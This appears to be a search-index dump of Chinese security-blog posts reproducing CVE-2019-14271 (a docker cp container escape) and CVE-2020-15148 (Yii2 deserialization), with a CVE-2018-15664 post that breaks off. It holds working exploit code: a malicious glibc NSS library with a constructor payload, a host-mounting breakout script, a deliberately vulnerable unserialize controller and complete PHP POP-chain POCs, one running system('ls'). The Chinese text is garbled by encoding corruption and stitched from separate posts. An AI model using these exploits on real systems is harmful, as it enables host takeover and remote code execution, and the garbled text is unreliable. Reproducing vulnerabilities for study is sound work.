Âú®ÂÖ∂‰∏≠‰∏Ä‰∏™Ê∫êÊñá‰ª∂‰∏≠Ê∑ªÂä†ÂáΩÊï∞run_at_link()Ôºå‰ΩøÁî®ÊûÑÈÄ†ÂáΩÊï∞ÂÆö‰πâËØ•ÂáΩÊï∞ÔºåÊâÄ‰ª•ÊØèÊ¨°ËøõÁ®ãÂä†ËΩΩÊó∂Ôºårun_at_link()ÂáΩÊï∞ÈÉΩËÉΩÂ§ü‰Ωú‰∏∫Â∫ìÁöÑÂàùÂßãÂåñÂáΩÊï∞ÊâßË°åÔºåÂç≥docker-tarËøõÁ®ãÂä®ÊÄÅÂä†ËΩΩÊ≠§Â∫ìÔºåÂáΩÊï∞Â∞±‰ºöÊâßË°å„ÄÇ Âú®files-service.cÊñá‰ª∂‰∏≠Âä†ÂÖ•Â¶Ç‰∏ãpayload // content should be added into nss/nss_files/files-service.c #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003csys/wait.h\u003e //ÂÆπÂô®ÂÜÖÈÉ®ÂéüÂßãoriginal_libnss_files.so.2Êñá‰ª∂ÁöÑÂ§á‰ªΩ‰ΩçÁΩÆ #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" //ÊÅ∂ÊÑèoriginal_libnss_files.so.2ÁöÑ‰ΩçÁΩÆ #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); //Â∏¶ÊúâconstructorÂ±ûÊÄßÁöÑÂáΩÊï∞‰ºöÂú®Âä®ÊÄÅÈìæÊé•Â∫ìË¢´Âä†ËΩΩÊó∂Ëá™Âä®ÊâßË°å __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; //Âà§Êñ≠ÂΩìÂâçÊòØÂê¶Êó∂ÂÆπÂô®Â§ñÁöÑÈ´òÊùÉÈôêËøõÁ®ãÔºàdocker-tarÔºâ //Â¶ÇÊûúÊó∂ÂÆπÂô®ÂÜÖËøõÁ®ãÔºåÂàô‰∏çÂÅö‰ªª‰ΩïÊìç‰Ωú if (!is_priviliged()) return; //ÊîªÂáªÂè™ÈúÄË¶ÅÊâßË°å‰∏ÄÊ¨°Âç≥ÂèØ //Áî®Â§á‰ªΩÁöÑÂéüÂßãlibnss_files.so.2Êñá‰ª∂ÊõøÊç¢ÊÅ∂ÊÑèlibnss_files.so.2Êñá‰ª∂ //ÈÅøÂÖçÂêéÁª≠ÁöÑdocker cpÊìç‰ΩúÊåÅÁª≠Âä†ËΩΩÊÅ∂ÊÑèlibnss_files.so.2Êñá‰ª∂ rename(ORIGINAL_LIBNSS, LIBNSS_PATH); //‰ª•docker-tarËøõÁ®ãÁöÑË∫´‰ªΩÂàõÂª∫Êñ∞ËøõÁ®ãÔºåÊâßË°åÂÆπÂô®ÂÜÖÁöÑbreakoutËÑöÊú¨ if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } return true; // we're running in the context of docker-tar } ÊÅ∂ÊÑèlibnss_files.so.2Êñá‰ª∂Ë¢´Âä†ËΩΩÊó∂ÔºåÈ¶ñÂÖà‰ºöÂà§Êñ≠ÂΩìÂâçÂä†ËΩΩËøõÁ®ãÊòØÂê¶‰∏∫docker-tarËøõÁ®ãÔºåÂ¶ÇÊûúÊòØÔºåÂàô‰ª•ÂΩìÂâçËøõÁ®ãÁöÑË∫´‰ªΩÊâßË°å/breakoutËÑöÊú¨„ÄÇÁî±‰∫édocker-tarÂπ∂Êú™ÂÅöÂÖ∂‰ªñÂëΩÂêçÁ©∫Èó¥Á∫ßÂà´‰∏äÁöÑÈöîÁ¶ªÔºåÂõ†Ê≠§/breakout‰ºö‰ª•docker-tarËá™Ë∫´ÁöÑrootÊùÉÈôêÂú®ÂÆø‰∏ªÊú∫ÂëΩÂêçÁ©∫Èó¥ÂÜÖÊâßË°å„ÄÇ ‰∏ãÈù¢ÁºñËØëÁîüÊàêÊÅ∂ÊÑèÈìæÊé•Êñá‰ª∂ cd /root/gnu/glibc-build mkdir config1 ../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/ make //ÁîüÊàêÁöÑÊÅ∂ÊÑèÂä®ÊÄÅÈìæÊé•Â∫ìÊñá‰ª∂‰∏∫/glibc-build/nss/libnss_files.soÔºõË¶ÅÊ≥®ÊÑèÁöÑÊòØlibnss_files.so.2‰∏∫ÈìæÊé•Êñá‰ª∂ÔºåÂà´ÂºÑÈîô‰∫Ü ËøôÈáåÊàë‰ª¨ÊâßË°åÂ§±Ë¥•‰∫Ü ../glibc-2.31/configure --prefix=/root/gnu/glibc-build/config1/ ÊòØÂõ†‰∏∫Áº∫Â∞ë‰∫Ü‰æùËµñÔºåÊâÄ‰ª•Êä•Èîô apt install bison apt install gawk ‰πãÂêéÊâßË°å‰∏ÄÈÅçÂëΩ‰ª§Â∞±‰∏ç‰ºöÊä•Èîô‰∫Ü Êàë‰ª¨make‰∏ã Ë¶ÅÂú®/root/gnu/glibc-build/ÁõÆÂΩï‰∏ãÊâßË°å Á¨¨‰∏ÄÊ¨°ÁºñËØëGlibcÈúÄË¶Å‰∏Ä‰∫õÊó∂Èó¥ÔºåÂêéÈù¢ÂÜçÊ¨°ÁºñËØëÂ∞±‰ºöÂø´ÂæàÂ§ö„ÄÇÁºñËØëÁªìÊùüÂêéÔºåglibc-build/nss/libnss_files.soÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶ÅÁöÑÊÅ∂ÊÑèÂä®ÊÄÅÈìæÊé•Â∫ìÊñá‰ª∂„ÄÇ ÂÆûÁé∞ÈÄÉÈÄ∏ Áé∞Âú®ÔºåÊàë‰ª¨Â∑≤ÁªèÊûÑÈÄ†Â•ΩÊÅ∂ÊÑèÁöÑÂä®ÊÄÅÈìæÊé•Â∫ìÊñá‰ª∂libnss_files.so„ÄÇÂú®Â≠òÂú®ÊºèÊ¥ûÁöÑdokcerÁéØÂ¢É‰∏≠ÔºåÂ¶ÇÊûúÁî®Êà∑ÊâßË°å‰∫Üdocker cpÔºåÂêéÂè∞ÁöÑdocker-tarËøõÁ®ãÂú®ÊâßË°å‰∫ÜchrootÂëΩ‰ª§Âêé‰∏ÄÊó¶Âä†ËΩΩÊÅ∂ÊÑèÊñá‰ª∂libnss_files.soÔºåÈÇ£‰πàÂÆπÂô®ÂÜÖ/breakoutËÑöÊú¨Â∞±‰ºö‰ª•docker-tarË∫´‰ªΩÊâßË°å„ÄÇ Áî±‰∫édocker-tarÂ∑≤ÁªèÂàáÊç¢‰∫ÜÊ†πÁõÆÂΩïÔºå‰ΩÜËøòÊ≤°ÊúâÂä†ÂÖ•ÂÆπÂô®ÁöÑÂëΩÂêçÁ©∫Èó¥ÔºåËÄÉËôëÂú®/breakout‰∏≠ÊâßË°åÊåÇËΩΩÊìç‰ΩúÔºåÁî±docker-tarÂ∞ÜÂÆø‰∏ªÊú∫Ê†πÁõÆÂΩïÊåÇÂú®Âà∞ÂÆπÂô®ÂÜÖÁöÑ/host_fsË∑ØÂæÑ„ÄÇËøôÊ†∑Â∞±ÂÆûÁé∞‰∫ÜÊñá‰ª∂Á≥ªÁªüÂ±ÇÈù¢ÁöÑÂÆπÂô®ÈÄÉÈÄ∏„ÄÇ Â∞ÜÊ≠§ËÑöÊú¨Êã∑Ë¥ùÂà∞ÂÆπÂô®Ê†πÁõÆÂΩïÔºåÂπ∂ÁªôÂÆÉÂä†‰∏ä777ÊùÉÈôê #!/bin/bash umount /host_fs \u0026\u0026 rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /hos","date":"2022-01-31","objectID":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:1","tags":["dockerÊºèÊ¥û"],"title":"CVE-2019-14271ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"ÂâçË®Ä ÊúÄËøëÂ≠¶‰π†PHPÂèçÂ∫èÂàóÂåñÈÅáÂà∞‰∫ÜYii2ÂèçÂ∫èÂàóÂåñÂæóÂà©Áî®ÔºåÂ∞±È°∫‰æøÊê≠‰∏Ä‰∏ãÁéØÂ¢ÉÔºåË∑üÁùÄÁΩë‰∏äÂêÑÁßçÂ∏àÂÇÖ‰ª¨ÁöÑÊñáÁ´†Â§çÁé∞ÂíåÂ≠¶‰π†ÔºåÊèêÈ´òËá™Â∑±‰ª£Á†ÅÂÆ°ËÆ°ËÉΩÂäõ„ÄÇ ÊºèÊ¥ûÂá∫Áé∞Âú®yii2.0.38‰πãÂâçÁöÑÁâàÊú¨‰∏≠,Âú®2.0.38ËøõË°å‰∫Ü‰øÆÂ§çÔºåCVEÁºñÂè∑ÊòØCVE-2020-15148Ôºö Yii 2 (yiisoft/yii2) before version 2.0.38 is vulnerable to remote code execution if the application calls unserialize() on arbitrary user input. This is fixed in version 2.0.38. A possible workaround without upgrading is available in the linked advisory. Yii2‰ªãÁªç Yii ÊòØ‰∏Ä‰∏™È´òÊÄßËÉΩÔºåÂü∫‰∫éÁªÑ‰ª∂ÁöÑ PHP Ê°ÜÊû∂ÔºåÁî®‰∫éÂø´ÈÄüÂºÄÂèëÁé∞‰ª£ Web Â∫îÁî®Á®ãÂ∫è„ÄÇÂç≥ÂèØ‰ª•Áî®‰∫éÂºÄÂèëÂêÑÁßçÁî® PHP ÊûÑÂª∫ÁöÑ Web Â∫îÁî®„ÄÇÂõ†‰∏∫Âü∫‰∫éÁªÑ‰ª∂ÁöÑÊ°ÜÊû∂ÁªìÊûÑÂíåËÆæËÆ°Á≤æÂ∑ßÁöÑÁºìÂ≠òÊîØÊåÅÔºåÂÆÉÁâπÂà´ÈÄÇÂêàÂºÄÂèëÂ§ßÂûãÂ∫îÁî®Ôºå Â¶ÇÈó®Êà∑ÁΩëÁ´ô„ÄÅÁ§æÂå∫„ÄÅÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºàCMSÔºâ„ÄÅ ÁîµÂ≠êÂïÜÂä°È°πÁõÆÂíå RESTful Web ÊúçÂä°Á≠â„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫ windows10 phpstudy yii2ÁâàÊú¨:2.037Âíå2.0.38 phpÁâàÊú¨:7.3.4 ‰øÆÊîπconfig\\web.php‰∏≠ÁöÑcookieValidationKey‰∏∫‰ªªÊÑèÂÄºÔºå‰Ωú‰∏∫yii\\web\\request::cookieValidationKeyÁöÑÂä†ÂØÜÂÄºÔºå‰∏çËÆæÁΩÆÂ∞±‰ºöÊä•Èîô„ÄÇ Êé•ÁùÄËá™Â∑±Ê∑ªÂä†‰∏Ä‰∏™controllerÊù•ËøõË°åÊºèÊ¥ûÁöÑÂà©Áî®ÔºåÂàõÂª∫‰∏Ä‰∏™action: http://url/index.php?r=test/test, controllersÁöÑÂëΩÂêçÊòØ : ÂêçÁß∞ControllerÔºåactionÁöÑÂëΩÂêçÊòØ: actionÂêçÁß∞ÔºåÂ¶Ç‰∏ã controllers/TestController.php \u003c?php namespace app\\controllers; use yii\\web\\Controller; class TestController extends Controller{ public function actionTest($data){ return unserialize(base64_decode($data)); } } ?\u003e ÂèëÂåÖÊµãËØïÔºåÁéØÂ¢ÉÊê≠Âª∫ÊàêÂäü ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["yii2Ê°ÜÊû∂"],"title":"Yii2Ê°ÜÊû∂ ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§çÁé∞","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"2.3.07ÁâàÊú¨ÂèçÂ∫èÂàóÂåñ POC1 ÊºèÊ¥ûÁöÑËß¶ÂèëÁÇπÂú®\\yii\\vendor\\yii2\\db\\BatchQueryResult.phpÊñá‰ª∂‰∏≠Ôºå public function __destruct() { // make sure cursor is closed $this-\u003ereset(); } public function reset() { if ($this-\u003e_dataReader !== null) { $this-\u003e_dataReader-\u003eclose(); } $this-\u003e_dataReader = null; $this-\u003e_batch = null; $this-\u003e_value = null; $this-\u003e_key = null; } ÂèØ‰ª•ÁúãÂà∞Ôºå__destructË∞ÉÁî®‰∫ÜresetÊñπÊ≥ï resetÊñπÊ≥ïresetË∞ÉÁî®‰∫ÜcloseÊñπÊ≥ïÔºåÂèÇÊï∞ _dataReaderÂèØÊéß„ÄÇÂ≠¶‰π†ÊÄùË∑ØÂêéÁü•ÈÅìËøôÈáåÂèØ‰ª•ÈÄöËøáËß¶Âèë __callÊñπÊ≥ïÊù•ËøõË°åÂà©Áî® __call:ÂΩì‰∏Ä‰∏™ÂØπË±°Âú®ÂØπË±°‰∏ä‰∏ãÊñá‰∏≠Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑÊñπÊ≥ïÊó∂Ëß¶Âèë ÂΩì‰∏Ä‰∏™ÂØπË±°Ë∞ÉÁî®‰∏çÂèØËÆøÈóÆÁöÑcloseÊñπÊ≥ïÊàñËÄÖÁ±ª‰∏≠ÂéãÊ†πÂ∞±Ê≤°ÊúâcloseÊñπÊ≥ïÔºåÂç≥ÂèØËß¶Âèë __call,ÂÖ®Â±ÄÊêúÁ¥¢ __callÊñπÊ≥ï public function __call($method, $attributes) { return $this-\u003eformat($method, $attributes); } public function format($formatter, $arguments = array()) { return call_user_func_array($this-\u003egetFormatter($formatter), $arguments); } public function getFormatter($formatter) { if (isset($this-\u003eformatters[$formatter])) { return $this-\u003eformatters[$formatter]; } foreach ($this-\u003eproviders as $provider) { if (method_exists($provider, $formatter)) { $this-\u003eformatters[$formatter] = array($provider, $formatter); return $this-\u003eformatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter)); } __callÊñπÊ≥ïË∞ÉÁî®‰∫ÜÁ±ª‰∏≠ÁöÑ formatÁöÑÊñπÊ≥ïÔºåformatÊñπÊ≥ïÈáåÁöÑ call_user_func_arrayÈáåÁöÑÂèÇÊï∞Ë∞ÉÁî®‰∫Ü getFormatterÊñπÊ≥ï call_user_func_array :Ë∞ÉÁî®ÂõûË∞ÉÂáΩÊï∞ÔºåÂπ∂Êää‰∏Ä‰∏™Êï∞ÁªÑÂèÇÊï∞‰Ωú‰∏∫ÂõûË∞ÉÂáΩÊï∞ÁöÑÂèÇÊï∞ Â§ßËá¥‰ΩøÁî®ÊñπÊ≥ïÂ¶Ç‰∏ã: \u003c?php function¬†foobar($arg,¬†$arg2)¬†{ echo¬†__FUNCTION__,¬†\"¬†got¬†$arg¬†and¬†$arg2\\n\"; } class¬†foo¬†{ function¬†bar($arg,¬†$arg2)¬†{ echo¬†__METHOD__,¬†\"¬†got¬†$arg¬†and¬†$arg2\\n\"; } } //¬†Call¬†the¬†foobar()¬†function¬†with¬†2¬†arguments call_user_func_array(\"foobar\",¬†array(\"one\",¬†\"two\")); //¬†Call¬†the¬†$foo-\u003ebar()¬†method¬†with¬†2¬†arguments $foo¬†=¬†new¬†foo; call_user_func_array(array($foo,¬†\"bar\"),¬†array(\"three\",¬†\"four\")); ?\u003e getFormatterÊñπÊ≥ï‰ªé $this-\u003eformatterÂèØÊéßÔºåÊâÄ‰ª•ËøôÈáåÂèØ‰ª•Ë∞ÉÁî®‰ªªÊÑèÁ±ª‰∏≠ÁöÑ‰ªªÊÑèÊñπÊ≥ï‰∫Ü„ÄÇ ‰ΩÜÊòØ $argumentsÊòØ‰ªé yii\\db\\BatchQueryResult::reset()Èáå‰º†ËøáÊù•ÁöÑÔºåÊàëÈó®‰∏çÂèØÊéßÔºåÊØîÂ¶ÇËøôÈáåÂ∞±‰∏∫Á©∫ÔºåÂõ†‰∏∫‰º†Êù•ÁöÑ closeÊñπÊ≥ï‰∏≠‰º†ÂèÇÊï∞ÂÄºÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ËÉΩ‰∏çÂ∏¶ÂèÇÊï∞Âú∞ÂéªË∞ÉÁî®Âà´ÁöÑÁ±ª‰∏≠ÁöÑÊñπÊ≥ï„ÄÇ Âà∞Ëøô‰∏ÄÊ≠•Â∞±ÈúÄË¶Å‰∏Ä‰∏™ÊâßË°åÁ±ªÔºåËøôÊó∂ÂÄôÈúÄË¶ÅÁ±ª‰∏≠ÁöÑÊñπÊ≥ïÈúÄË¶ÅÊª°Ë∂≥‰∏§‰∏™Êù°‰ª∂ ÊñπÊ≥ïÊâÄÈúÄÁöÑÂèÇÊï∞Âè™ËÉΩÊòØÂÖ∂Ëá™Â∑±Á±ª‰∏≠Â≠òÂú®ÁöÑ(Âç≥ÂèÇÊï∞: $this-\u003eargs) ÊñπÊ≥ïÈúÄË¶ÅÊúâÂëΩ‰ª§ÊâßË°åÂäüËÉΩ ÈÄöËøáÂÖ®Â±ÄÊü•ÊâæÊ≠£ÂàôÂåπÈÖç call_user_func\\(\\$this-\u003e([a-zA-Z0-9]+), \\$this-\u003e([a-zA-Z0-9]+)Êù•Êü•ÊâæÔºåÁªìÊûúÂ¶Ç‰∏ã call_user_func :ÊääÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰Ωú‰∏∫ÂõûË∞ÉÂáΩÊï∞Áî®ÔºåËøôÈáåÁî® call_user_funcÂç≥ÂèØËææÂà∞ÂëΩ‰ª§ÊâßË°åÁöÑÊïàÊûú‰πüÂèØ‰ª•ËææÂà∞ RCE ÁöÑÊïàÊûú Â§ßËá¥‰ΩøÁî®ÊñπÊ≥ïÂ¶Ç‰∏ã \u003c?php error_reporting(E_ALL); function¬†increment(\u0026$var) { $var++; } $a¬†=¬†0; call_user_func('increment',¬†$a); echo¬†$a.\"\\n\"; call_user_func_array('increment',¬†array(\u0026$a));¬†//¬†You¬†can¬†use¬†this¬†instead¬†before¬†PHP¬†5.3 echo¬†$a.\"\\n\"; ?\u003e ÂÖ∂‰∏≠Êúâ‰∏§‰∏™Á±ª‰∏≠ÁöÑ runÊñπÊ≥ïÂèØÁî® yii\\rest\\CreateAction::run() Ôºå$this-\u003eid‰∏§‰∏™ÂèÇÊï∞ÂèØÊéß public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } //‰∏ªË¶ÅËøòÊòØÁúãËøôÈáå /* @var $model \\yii\\db\\ActiveRecord */ $model = new $this-\u003emodelClass([ 'scenario' =\u003e $this-\u003escenario, ]); $model-\u003eload(Yii::$app-\u003egetRequest()-\u003egetBodyParams(), ''); if ($model-\u003esave()) { $response = Yii::$app-\u003egetResponse(); $response-\u003esetStatusCode(201); $id = implode(',', array_values($model-\u003egetPrimaryKey(true))); $response-\u003egetHeaders()-\u003eset('Location', Url::toRoute([$this-\u003eviewAction, 'id' =\u003e $id], true)); } elseif (!$model-\u003ehasErrors()) { throw new ServerErrorHttpException('Failed to create the object for unknown reason.'); } return $model; } \\yii\\rest\\IndexAction::run(), $this-\u003echeckAccess,$this-\u003eid‰∏§‰∏™ÂèÇÊï∞ÂèØÊéß public function run() { if ($this-\u003echeckAccess) { call_user_func($this-\u003echeckAccess, $this-\u003eid); } return $this-\u003eprepareDataProvider(); } ‰∫éÊòØÂ∞±ÂèØ‰ª•ÊûÑÈÄ†ÂÆåÊï¥ÁöÑ popÈìæ yii\\db\\BatchQueryResult::__destruct()-\u003ereset()-\u003eclose() -\u003e Faker\\Generator::__call()-\u003eformat()-\u003ecall_user_func_array() -\u003e \\yii\\rest\\IndexAction::run-\u003ecall_user_func() Exp \u003c?php namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'phpinfo'; $this-\u003eid = '1'; //command } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct(){ $this-\u003eformatters['close'] = [new IndexAction, 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-\u003e_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(n","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["yii2Ê°ÜÊû∂"],"title":"Yii2Ê°ÜÊû∂ ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§çÁé∞","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"2.3.08ÁâàÊú¨ÂèçÂ∫èÂàóÂåñ Âà©Áî®ÈìæÁöÑËµ∑ÁÇπ\\yii\\vendor\\codeception\\codeception\\ext\\RunProcess.php public function __destruct() { $this-\u003estopProcess(); } public function stopProcess() { foreach (array_reverse($this-\u003eprocesses) as $process) { /** @var $process Process **/ if (!$process-\u003eisRunning()) { continue; } $this-\u003eoutput-\u003edebug('[RunProcess] Stopping ' . $process-\u003egetCommandLine()); $process-\u003estop(); } $this-\u003eprocesses = []; } ÂêåÊ†∑ËøòÊòØÊâæ __destruct()ÊñπÊ≥ïË∞ÉÁî®‰∫Ü stopProcessÂáΩÊï∞ÔºåÂõ†‰∏∫ËøôÈáåÁöÑ $this-\u003eprocessesÂèØÊéßÔºå‰πüÂ∞±ÊÑèÂë≥ÁùÄ processÂèØÊéßÔºåÁÑ∂Âêé‰∏ãÈù¢ÂèàË∞ÉÁî®‰∫Ü process-\u003eisRunning,ÂèØ‰ª•Êé•‰∏äÁ¨¨‰∏ÄÊù°Âà©Áî®ÈìæÁöÑ __callÊñπÊ≥ïÂºÄÂ§¥ÁöÑÂêéÂçäÊÆµ„ÄÇ Âà©Áî®Èìæ1 Codeception\\Extension\\RunProcess::__destruct()-\u003eFaker\\Genrator::__call()-\u003eyii\\rest\\IndexAction::run() Poc2 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'system'; $this-\u003eid = 'ls'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ // ËøôÈáåÈúÄË¶ÅÊîπ‰∏∫isRunning $this-\u003eformatters['isRunning'] = [new CreateAction(), 'run']; } } } // poc2 namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct() { $this-\u003eprocesses = [new Generator()]; } } } namespace{ // ÁîüÊàêpoc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess())); } ?\u003e ËøêË°åpocÔºåÊàêÂäüRCE‰∫Ü Âà©Áî®Èìæ2 \\yii\\vendor\\swiftmailer\\swiftmailer\\lib\\classes\\Swift\\KeyCache\\DiskKeyCache.phpÊñá‰ª∂‰∏≠Ôºå public function __destruct() { foreach ($this-\u003ekeys as $nsKey =\u003e $null) { $this-\u003eclearAll($nsKey); } } Ë∑üËøõ clearAllÊñπÊ≥ï public function clearAll($nsKey) { if (array_key_exists($nsKey, $this-\u003ekeys)) { foreach ($this-\u003ekeys[$nsKey] as $itemKey =\u003e $null) { $this-\u003eclearKey($nsKey, $itemKey); } if (is_dir($this-\u003epath.'/'.$nsKey)) { rmdir($this-\u003epath.'/'.$nsKey); } unset($this-\u003ekeys[$nsKey]); } } ËøôÈáåÁöÑthis-\u003ekeys‰ª•Âèä$nsKey„ÄÅ$itemKeyÈÉΩÊòØÊàë‰ª¨ÂèØÊéßÁöÑÔºåÊâÄ‰ª•ÊòØÂèØ‰ª•ÊâßË°åÂà∞$this-\u003eclearKeyÁöÑÔºåË∑üËøõÁúãÁúã: public function clearKey($nsKey, $itemKey) { if ($this-\u003ehasKey($nsKey, $itemKey)) { $this-\u003efreeHandle($nsKey, $itemKey); unlink($this-\u003epath.'/'.$nsKey.'/'.$itemKey); } } ËøôÈáåÁöÑ$this-\u003epath‰πüÂèØÊéßÔºåÂèØ‰ª•ÁúãÂà∞ËøôÈáåÊòØËøõË°å‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÊãºÊé•Êìç‰ΩúÔºåÈÇ£‰πàÊÑèÂë≥ÁùÄÂèØ‰ª•Âà©Áî®È≠îÊúØÊñπÊ≥ï__toStringÊù•Ëß¶ÂèëÂêéÁª≠Êìç‰Ωú„ÄÇ ÂÖ®Â±ÄÊêúÁ¥¢__toString Êñá‰ª∂Ë∑ØÂæÑ\\yii\\vendor\\phpdocumentor\\reflection-docblock\\src\\DocBlock\\Tags\\see.php ‰ΩøÁî®See.php‰∏æ‰æã public function __toString() : string { return $this-\u003erefers . ($this-\u003edescription ? ' ' . $this-\u003edescription-\u003erender() : ''); } ÂèØ‰ª•ÁúãÂà∞$this-\u003edescriptionÂèØÊéßÔºåÂèàÂèØ‰ª•Âà©Áî® __call Âà©Áî®Èìæ3 Swift_KeyCache_DiskKeyCache -\u003e phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()-\u003e Faker\\Generator::__call() -\u003e yii\\rest\\IndexAction::run() POC3 \u003c?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-\u003echeckAccess = 'phpinfo'; $this-\u003eid = '1'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ // ËøôÈáåÈúÄË¶ÅÊîπ‰∏∫isRunning $this-\u003eformatters['render'] = [new CreateAction(), 'run']; } } } namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-\u003edescription = new Generator(); } } } namespace{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache{ private $keys = []; private $path; public function __construct() { $this-\u003epath = new See; $this-\u003ekeys = array( \"axin\"=\u003earray(\"is\"=\u003e\"handsome\") ); } } // ÁîüÊàêpoc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache())); } ?\u003e ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["yii2Ê°ÜÊû∂"],"title":"Yii2Ê°ÜÊû∂ ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§çÁé∞","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["web"],"content":"Â∞èÁªì ÂèëÁé∞ËøôÂá†‰∏™popÈìæÁî®Êù•Áî®ÂéªÊúÄÂêéÈÉΩÊòØÈù†ÁùÄ__callÊñπÊ≥ïÊù•Ëß¶Âèë‰ª£Á†ÅÊâßË°å„ÄÇ ÊâæÈìæÂ≠êÁöÑÂºÄÁ´ØÂèØ‰ª•Â∞ùËØï‰ªé__destructÂÖ•ÊâãÔºåÁÑ∂ÂêéËøΩÈìæÔºåËøΩÊñπÊ≥ï __call_user_func‰∏≠ÁöÑcallbackÂèØ‰ª•ÊòØÊï∞ÁªÑ 2.0.38ËøòÊúâ2‰∏™ÈìæÂ≠êÊ≤°ÂºÑ 2.0.42ËøòÊúâÈìæÂ≠ê‚Ä¶. ","date":"2022-01-19","objectID":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["yii2Ê°ÜÊû∂"],"title":"Yii2Ê°ÜÊû∂ ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂ§çÁé∞","uri":"/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"Á¨¨‰∏ÄÁØáÊñáÁ´†","date":"2022-01-14","objectID":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["dockerÊºèÊ¥û"],"title":"CVE-2018-15664ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"CVE-2018-15664ÔºöÁ¨¶Âè∑ÈìæÊé•ÊõøÊç¢ÊºèÊ¥û ÂâçÁΩÆÁü•ËØÜ docker cp Áî®‰∫éÂÆπÂô®ÂíåÂÆø‰∏ªÊú∫Êñá‰ª∂Á≥ªÁªü‰πãÈó¥ËøõË°åÊñá‰ª∂ÊàñÁõÆÂΩïÂ§çÂà∂ //Â∞Ü‰∏ªÊú∫/www/xxxÊñá‰ª∂Êã∑Ë¥ùÂà∞ÂÆπÂô®685c2a289adfÁöÑ/wwwÁõÆÂΩï‰∏ã(Ëã•ÊòØ/www,ÂàôÊòØÊã∑Ë¥ùÂà∞ÂÆπÂô®Ê†πÁõÆÂΩï‰∏ãÔºåÈáçÂëΩÂêç‰∏∫www) docker cp 